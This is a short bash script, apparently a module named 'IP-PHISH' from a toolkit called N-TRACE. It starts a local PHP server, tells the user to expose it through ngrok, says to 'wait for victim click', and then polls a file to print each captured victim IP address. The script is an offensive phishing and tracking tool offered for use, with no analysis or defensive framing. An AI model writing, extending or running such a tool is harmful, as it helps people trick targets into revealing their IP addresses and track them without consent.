#!/bin/bash 
intro() {
  clear
  figlet IP-PHISH
  echo -e "\e[92m"
  echo 
  echo -e "[1] >> IP-PHISH "
  echo
  echo -e "[2] >> BACK TO MAIN MENU"
  echo 
  read -p "ENTER AN OPTION : " option 
  if [ $option = 1 ];
  then
  main
  elif [ $option = 2 ];
  then
  cd 
  cd N-TRACE 
  python2 main.py
  fi
}

main () {
clear 
figlet IP-PHISH 
echo -e "\e[92m"
read -p "ENTER A PORT : " port 
php -S 127.0.0.1:$port > /dev/null 2>&1 &
sleep 1.7
echo
echo -e "\e[31m[+] \e[33mBEFORE USE CONNECT WITH NGROK \e[31m[+]"
echo
echo -e "\e[31m[!] \e[36mSERVER HOSTED AT : \e[92m127.0.0.1:$port"
echo
echo -e "\e[0m--------------------------------"
echo -e "\e[31m[~] \e[33mWAIT FOR VICTIM CLICK \e[31m[~]\e[0m"
echo -e "--------------------------------"

echo


rm -rf ip.txt 

while true;
do
if [ -e ip.txt ];
then 
echo
ip5=$(cat ip.txt | grep IP: | awk '{print $2}')
echo -e "\e[31m[!] \e[95mIP FOUND : \e[92m$ip5"
rm -rf ip.txt
fi
done 

}

intro




